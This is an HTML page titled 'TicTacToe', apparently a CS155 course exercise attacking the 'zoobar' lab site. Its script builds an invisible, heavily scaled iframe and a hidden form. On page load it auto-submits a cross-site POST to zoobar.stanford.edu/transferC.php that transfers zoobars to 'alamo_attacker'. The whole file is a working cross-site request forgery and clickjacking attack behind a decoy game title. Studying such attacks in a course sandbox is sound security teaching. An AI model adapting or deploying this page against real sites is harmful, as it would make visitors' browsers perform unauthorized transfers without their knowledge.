<!DOCTYPE html>
<html>

	<head>
		<title>TicTacToe</title>
		<meta charset="UTF-8"/>
		<style>
			/*#outerFrame{display: none;}*/
		</style>
	</head>

	<body>

		<iframe id='outerFrame' name='outerFrame' scrolling="no" style='width: 100%; height: 700px; margin: 0px; padding: 0px; background-image: url("http://www.stanford.edu/~rmferrer/pfiles/cs155_sandbox/back.jpg"); background-repeat: no-repeat;'></iframe>
		
		
		<script type="text/javascript">
		//<![CDATA[
			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; transform: scale(26, 36) translate(100px, 720px);'></iframe>" +
				"<form id='transferForm' style='display:none' action='http://zoobar.stanford.edu/transferC.php' method='POST' target='innerFrame'>" +
				"<input type='text' name='zoobars' value='1'>" +
				"<input type='text' name='recipient' value='alamo_attacker'>" +
				"<input type='text' name='submission' value='Send'>" +
				"</form>";

			// TODO: need to change localhost to zoobar.stanford.edu

			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
			
			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. 
			// See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
			outerFrameDoc.open();
			outerFrameDoc.close();
			//Set innerHTML of the body tag.
			outerFrameDoc.body.innerHTML = egg;
			
			var transferForm = outerFrameDoc.body.children['transferForm'];
			transferForm.submit();
			
			//setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
		//]]>
		</script>
		
	</body>

</html>
